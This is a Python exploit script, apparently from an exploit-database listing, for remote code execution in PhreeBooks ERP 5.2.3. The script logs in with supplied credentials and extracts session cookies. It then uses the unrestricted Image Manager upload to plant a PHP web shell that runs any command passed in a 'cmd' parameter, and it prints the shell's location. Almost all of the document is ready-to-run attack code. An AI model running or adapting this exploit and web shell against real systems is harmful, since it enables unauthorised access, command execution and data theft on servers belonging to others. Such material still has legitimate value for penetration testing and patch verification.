# Exploit Title: PhreeBooks 5.2.3 - Remote Code Execution
# Date: 22 Jan 2021
# Exploit Author: Kr0ff
# Vendor Homepage: https://www.phreesoft.com/
# Software Link: https://sourceforge.net/projects/phreebooks/
# Version: 5.2.3
# Tested on: Windows Server 2016

#!/usr/bin/env python3

'''
DESCRIPTION:
    - PhreeBooks ERP 5.2.3 is vulnerable to remote code execution
      due to authenticated unrestricted file upload in the "Image Manager"
      section of the application.

VULNERABLE VERSION:
    - ver 5.2.3

AUTHOR:
    - Kr0ff

Note: This is a rewrite of exploit: https://www.exploit-db.com/exploits/46645

Web shell used as payload: https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985
'''
#https://asciiart.website/index.php?art=animals/

try:
    import requests
    import argparse
    import sys
    import re
    import random
    from termcolor import colored
    from time import sleep
except ImportError as e:
    print(colored("[ERROR]: ", "red"), f"{e}")

def ascii_art():
    example_usage = "python3 exploit.py -t http://10.10.10.120/phreebooks -u admin@phreebooks.com -p admin"
    art = '''

                 \     /
             \    o ^ o    /
               \ (     ) /
    ____________(%%%%%%%)____________
   (     /   /  )%%%%%%%(  \   \     )
   (___/___/__/           \__\___\___)
      (     /  /(%%%%%%%)\  \     )
       (__/___/ (%%%%%%%) \___\__)
               /(       )\\
             /   (%%%%%)   \\
                  (%%%)
                    !

 | _ \ |_  _ _ ___ ___| |__  ___  ___| |__ ___
 |  _/ ' \| '_/ -_) -_) '_ \/ _ \/ _ \ / /(_-<
 |_| |_||_|_| \___\___|_.__/\___/\___/_\_\/__/
         ___ ___ ___   ___  ___ ___
        | __| _ \ _ \ | _ \/ __| __|
        | _||   /  _/ |   / (__| _|
        |___|_|_\_|   |_|_\\___|___|    v5.2.3
==============================================
'''
    print(art)
    print(example_usage)
    print("\r\n==============================================\r\n")

def exploit(TARGET, USER, PASS):
    '''
    PHP Reverse Shell
    '''
    web_shell = """
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
"""

    '''
    Perform the login and grab cookies of user
    '''
    error_msg = "The information you entered cannot be validated, please retry."
    url = f"{TARGET}/index.php?&p=bizuno/portal/login"
    headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Referer": f"{TARGET}/index.php?p=", "Content-Type": "multipart/form-data; boundary=---------------------------211698600840544395022617560470", "Connection": "close"}
    login_data=f"-----------------------------211698600840544395022617560470\r\nContent-Disposition: form-data; name=\"UserID\"\r\n\r\n{USER}\r\n-----------------------------211698600840544395022617560470\r\nContent-Disposition: form-data; name=\"UserPW\"\r\n\r\n{PASS}\r\n-----------------------------211698600840544395022617560470\r\nContent-Disposition: form-data; name=\"UserLang\"\r\n\r\nen_US\r\n-----------------------------211698600840544395022617560470--\r\n"

    print(colored("[*]","blue"), f"Logging in using account: \"{USER}\"")
    r = requests.post(url, headers=headers, data=login_data, verify=False)

    if error_msg in r.text:
        print(colored("[-]","red"), f"Couldn't log in using account: \"{USER}\"...")
        print("Something could be wrong, check everything and try again...")
        sys.exit(1)
        print(colored("[+]","green"), f"Logged in with account: \"{USER}\"")
    else:
        print(colored("[+]","green"), f"Logged in with account: \"{USER}\"")

    try:
        print(colored("[*]","blue"), f"Grabbing cookies...")
        get_all_cookies = r.headers['Set-Cookie']
        get_needed_cookies = re.split(r'\s', get_all_cookies)[6].replace(';','').replace('bizunoSession=','').strip()
        user_cookie = re.split(r'\s', get_all_cookies)[13].replace(';','').replace('bizunoUser=','').strip()
    except IndexError:
        print(colored("[-]","red"), f"Couldn't grab cookies...")
        print("Something could be wrong, check everything and try again...")
        sys.exit(1)

    '''
    Continue with the exploitation part of the exploit
    Uploading a file with random name and .php extension,
    since "Image Manager" doesn't restrict file types
    '''

    f_name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for i in range(10)) + ".php"
    print(colored("[*]","blue"), f"Trying to upload file \"{f_name}\"")

    e_url = f"{TARGET}/index.php?&p=bizuno/image/manager&imgTarget=&imgMgrPath=&imgSearch=&imgAction=upload"
    e_cookies = {"bizunoLang": "en_US", "bizunoUser": f"{user_cookie}", "bizunoSession": f"{get_needed_cookies}"}
    e_headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Referer": f"{TARGET}/index.php?", "Content-Type": "multipart/form-data; boundary=---------------------------211698600840544395022617560470", "Connection": "close"}
    e_data= f'-----------------------------211698600840544395022617560470\r\nContent-Disposition: form-data; name="imgSearch"\r\n\r\n\r\n-----------------------------211698600840544395022617560470\r\nContent-Disposition: form-data; name="imgFile"; filename="{f_name}"\r\nContent-Type: binary/octet-stream\r\n\r\n{web_shell}\n\r\n-----------------------------211698600840544395022617560470--\r\n'

    u_req = requests.post(e_url, headers=e_headers, cookies=e_cookies, data=e_data, verify=False)
    if u_req.status_code == 200:
        print(colored("[+]","green"), f"Uploaded file: \"{f_name}\"")
    else:
        print(colored("[-]","red"), f"Couldn't upload file: \"{f_name}\"")
        print("Something could be wrong, check everything and try again...")
        sys.exit(1)

    '''
    Perform the execution of the PHP reverse shell
    by accessing the path to it
    '''
    sreq = requests.get(f"{TARGET}/myFiles/images/{f_name}")
    if sreq.status_code == 200:
        print(colored("[+]", "green"), f"Webshell is uploaded to: {TARGET}/myFiles/images/{f_name}")
    elif sreq.status_code == 404:
        print(colored("[-]", "red"), f"Webshell was not uploaded !\r\nCheck your target...")
        print("Check if the upload file path is correct in the exploit and in the web application...")
        sys.exit(0)
    else:
        print(colored("[!]", "yellow"), f"Something could be wrong, check everything and try again...\r\n")
        sys.exit(1)

'''
Initilize parser for arguments
'''
def parse_argz():
    parser = argparse.ArgumentParser(description='PhreeBooks 5.2.3 Remote Code Execution via Authenticated File Upload ')
    parser.add_argument("-t", "--target", help="Target http/s:[IP/HOSTNAME]/phreebooks", type=str, required=True)
    parser.add_argument("-u", "--user", help="Email to login as", type=str, required=True)
    parser.add_argument("-p", "--passwd", help="Password to authenticate with", type=str, required=True)
    #args = parser.parse_args(args=None if sys.argv[1:] else ['--help']) #Show help menu if no arguments provided
    args = parser.parse_args(args=None)

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    TARGET = str(args.target)
    USER = str(args.user)
    PASS = str(args.passwd)

    exploit(TARGET, USER, PASS)

if __name__ == "__main__":
    try:
        ascii_art()
        parse_argz()
    except Exception as e:
       print(colored("[ERROR]","red"), f"-> {e}")
       sys.exit(1)